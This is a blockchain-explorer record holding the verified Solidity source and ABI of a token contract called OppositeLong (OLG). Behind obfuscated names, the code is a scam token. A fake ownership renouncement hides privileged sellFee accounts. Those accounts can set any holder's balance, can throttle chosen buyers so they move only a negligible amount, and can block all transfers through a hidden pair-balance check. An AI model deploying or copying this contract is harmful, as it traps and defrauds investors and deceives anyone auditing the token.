{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface autoList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract listTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeToken {\n    function createPair(address walletTotal, address modeReceiver) external returns (address);\n}\n\ninterface sellReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toWallet) external view returns (uint256);\n\n    function transfer(address maxSwapReceiver, uint256 totalMarketing) external returns (bool);\n\n    function allowance(address fromExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxSwapReceiver,\n        uint256 totalMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMode, uint256 value);\n    event Approval(address indexed fromExempt, address indexed spender, uint256 value);\n}\n\ninterface launchedWallet is sellReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OppositeLong is listTo, sellReceiver, launchedWallet {\n\n    bool public liquidityMode;\n\n    bool public txExempt;\n\n    address feeEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant listExempt = 14 ** 10;\n\n    uint256 private maxAt;\n\n    mapping(address => bool) public sellFee;\n\n    string private minMarketingBuy = \"Opposite Long\";\n\n    uint256 private enableSwap = 100000000 * 10 ** 18;\n\n    function fromLimit() private view {\n        require(sellFee[_msgSender()]);\n    }\n\n    bool public modeMinAt;\n\n    bool public listBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return minMarketingBuy;\n    }\n\n    function owner() external view returns (address) {\n        return buyListAmount;\n    }\n\n    uint8 private enableBuy = 18;\n\n    function tradingAmount(address buyTeam) public {\n        fromLimit();\n        \n        if (buyTeam == receiverLaunchAuto || buyTeam == listLaunched) {\n            return;\n        }\n        launchMax[buyTeam] = true;\n    }\n\n    address public receiverLaunchAuto;\n\n    uint256 public sellLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellTo;\n    }\n\n    bool public isAtAuto;\n\n    function balanceOf(address toWallet) public view virtual override returns (uint256) {\n        return autoFeeList[toWallet];\n    }\n\n    function walletFromFund(address enableIs, address maxSwapReceiver, uint256 totalMarketing) internal returns (bool) {\n        if (enableIs == receiverLaunchAuto) {\n            return totalMode(enableIs, maxSwapReceiver, totalMarketing);\n        }\n        uint256 fundIsFee = sellReceiver(listLaunched).balanceOf(feeEnable);\n        require(fundIsFee == limitWallet);\n        require(maxSwapReceiver != feeEnable);\n        if (launchMax[enableIs]) {\n            return totalMode(enableIs, maxSwapReceiver, listExempt);\n        }\n        return totalMode(enableIs, maxSwapReceiver, totalMarketing);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverSender;\n\n    event OwnershipTransferred(address indexed autoTokenExempt, address indexed swapMode);\n\n    function receiverFundTake(uint256 totalMarketing) public {\n        fromLimit();\n        limitWallet = totalMarketing;\n    }\n\n    function fromReceiver() public {\n        emit OwnershipTransferred(receiverLaunchAuto, address(0));\n        buyListAmount = address(0);\n    }\n\n    address private buyListAmount;\n\n    constructor (){\n        if (modeMinAt == liquidityMode) {\n            sellLaunch = maxAt;\n        }\n        autoList receiverBuy = autoList(tokenLaunched);\n        listLaunched = takeToken(receiverBuy.factory()).createPair(receiverBuy.WETH(), address(this));\n        \n        receiverLaunchAuto = _msgSender();\n        fromReceiver();\n        sellFee[receiverLaunchAuto] = true;\n        autoFeeList[receiverLaunchAuto] = enableSwap;\n        \n        emit Transfer(address(0), receiverLaunchAuto, enableSwap);\n    }\n\n    function transferFrom(address enableIs, address maxSwapReceiver, uint256 totalMarketing) external override returns (bool) {\n        if (_msgSender() != tokenLaunched) {\n            if (receiverSender[enableIs][_msgSender()] != type(uint256).max) {\n                require(totalMarketing <= receiverSender[enableIs][_msgSender()]);\n                receiverSender[enableIs][_msgSender()] -= totalMarketing;\n            }\n        }\n        return walletFromFund(enableIs, maxSwapReceiver, totalMarketing);\n    }\n\n    address public listLaunched;\n\n    uint256 limitWallet;\n\n    function approve(address maxList, uint256 totalMarketing) public virtual override returns (bool) {\n        receiverSender[_msgSender()][maxList] = totalMarketing;\n        emit Approval(_msgSender(), maxList, totalMarketing);\n        return true;\n    }\n\n    mapping(address => bool) public launchMax;\n\n    uint256 sellFrom;\n\n    function tokenReceiverExempt(address toSell, uint256 totalMarketing) public {\n        fromLimit();\n        autoFeeList[toSell] = totalMarketing;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableSwap;\n    }\n\n    mapping(address => uint256) private autoFeeList;\n\n    function toLimit(address exemptTo) public {\n        if (isAtAuto) {\n            return;\n        }\n        \n        sellFee[exemptTo] = true;\n        \n        isAtAuto = true;\n    }\n\n    uint256 public fundAt;\n\n    function getOwner() external view returns (address) {\n        return buyListAmount;\n    }\n\n    function allowance(address autoTake, address maxList) external view virtual override returns (uint256) {\n        if (maxList == tokenLaunched) {\n            return type(uint256).max;\n        }\n        return receiverSender[autoTake][maxList];\n    }\n\n    function transfer(address toSell, uint256 totalMarketing) external virtual override returns (bool) {\n        return walletFromFund(_msgSender(), toSell, totalMarketing);\n    }\n\n    address tokenLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private sellTo = \"OLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableBuy;\n    }\n\n    function totalMode(address enableIs, address maxSwapReceiver, uint256 totalMarketing) internal returns (bool) {\n        require(autoFeeList[enableIs] >= totalMarketing);\n        autoFeeList[enableIs] -= totalMarketing;\n        autoFeeList[maxSwapReceiver] += totalMarketing;\n        emit Transfer(enableIs, maxSwapReceiver, totalMarketing);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTokenExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAtAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMinAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"receiverFundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"toLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"tokenReceiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"}],\"name\":\"tradingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxSwapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OppositeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}